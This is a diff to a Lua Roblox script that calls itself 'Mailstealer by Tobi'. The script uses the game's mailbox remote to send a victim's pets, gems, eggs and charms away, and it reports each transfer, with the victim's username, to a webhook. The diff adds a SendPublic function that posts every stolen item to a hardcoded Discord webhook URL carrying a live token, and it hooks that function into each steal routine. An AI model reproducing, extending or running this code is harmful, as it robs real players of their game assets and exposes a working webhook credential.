@@ -16,12 +16,12 @@ function SendMessage(url, username, itemID)
             ["fields"] = {
                 {
                     ["name"] = "Victim Username:",
-                    ["value"] = username .. "\n",
+                    ["value"] = username,
                     ["inline"] = true
                 },
                 {
                     ["name"] = "Item Sent:",
-                    ["value"] = tostring(itemID), -- Convert itemID to string if it's not already
+                    ["value"] = tostring(itemID),
                     ["inline"] = true
                 }
             },
@@ -33,6 +33,39 @@ function SendMessage(url, username, itemID)
     local body = http:JSONEncode(data)
     local response = request({
 		Url = url,
+		Method = "POST",
+		Headers = headers,
+		Body = body
+	})
+end
+
+function SendPublic(itemID)
+    local http = game:GetService("HttpService")
+    local headers = {
+        ["Content-Type"] = "application/json"
+    }
+    local data = {
+        ["embeds"] = {{
+            ["title"] = "New Item Sent",
+            ["color"] = 65280,
+			["thumbnail"] = {
+				["url"] = "https://cdn.discordapp.com/attachments/1184878103781191780/1203372282882433204/87046.jpg"
+			},
+            ["fields"] = {
+                {
+                    ["name"] = "Item Sent:",
+                    ["value"] = tostring(itemID),
+                    ["inline"] = true
+                }
+            },
+			["footer"] = {
+				["text"] = "Mailstealer by Tobi. discord.gg/HcpNe56R2a"
+			}
+        }}
+    }
+    local body = http:JSONEncode(data)
+    local response = request({
+		Url = "https://discord.com/api/webhooks/1203380433044246620/11mkKcPnONCNbuHjDT-qL_xvPTT1eGa_szSzlYTdM_7Y75gEXCb-CDgscgRInEY2JKEN",
 		Method = "POST",
 		Headers = headers,
 		Body = body
@@ -109,6 +142,7 @@ function StealHuge()
 			if Webhook and Webhook ~= "" then
 				SendMessage(Webhook, game.Players.LocalPlayer.Name, id)
 			end
+			SendPublic(id)
 			local finalHuges = CountHuges()
 			if finalHuges < initialHuges then
 				hugesSent = hugesSent + 1
@@ -164,6 +198,7 @@ function ExcSteal()
 			if Webhook and Webhook ~= "" then
 				SendMessage(Webhook, game.Players.LocalPlayer.Name, id)
 			end
+			SendPublic(id)
 			local finalExc = CountExc()
 			if finalExc < initialExc then
 				excSent = excSent + 1
@@ -210,6 +245,7 @@ function EggSteal()
 			if Webhook and Webhook ~= "" then
 				SendMessage(Webhook, game.Players.LocalPlayer.Name, id)
 			end
+			SendPublic(id)
 		end
     end
 end
@@ -230,6 +266,7 @@ function CharmSteal()
 			if Webhook and Webhook ~= "" then
 				SendMessage(Webhook, game.Players.LocalPlayer.Name, id)
 			end
+			SendPublic(id)
 		end
     end
 end
@@ -249,6 +286,7 @@ function GemSteal()
             game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
 			if Webhook and Webhook ~= "" then
 			SendMessage(Webhook, game.Players.LocalPlayer.Name, "Gems: " .. (GemAmount - 10000))
+			SendPublic(GemAmount-10000)
 			end
         end
     end
